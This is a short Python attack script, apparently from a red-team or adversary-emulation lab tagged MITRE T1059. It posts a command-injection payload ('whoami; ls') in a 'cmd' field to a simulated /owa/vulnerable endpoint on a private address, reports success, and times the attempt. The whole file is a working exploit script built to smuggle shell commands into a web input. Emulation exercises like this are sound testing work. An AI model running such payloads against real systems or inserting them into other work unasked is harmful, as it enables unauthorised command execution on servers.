
# Command Injection (T1059 - Command and Scripting Interpreter)
# Objective: Exploit a simulated command injection vulnerability on /owa/vulnerable. 
import requests
import time

base_url = "http://172.20.10.7:80"
vulnerable_url = f"{base_url}/owa/vulnerable"

def command_injection():
    start_time = time.time()  # Start timing 
    print("Testing for command injection...")
    payload = {"cmd": "whoami; ls"}  # Example malicious input
    response = requests.post(vulnerable_url, data=payload)
    if response.status_code == 200:
        print("[+] Command Injection successful!")
        print(f"Response: {response.text}")
    else:
        print("[-] Command Injection failed.")
    end_time = time.time()  # End timing 
    print(f"Command injection execution time: {end_time - start_time:.2f} seconds")

command_injection()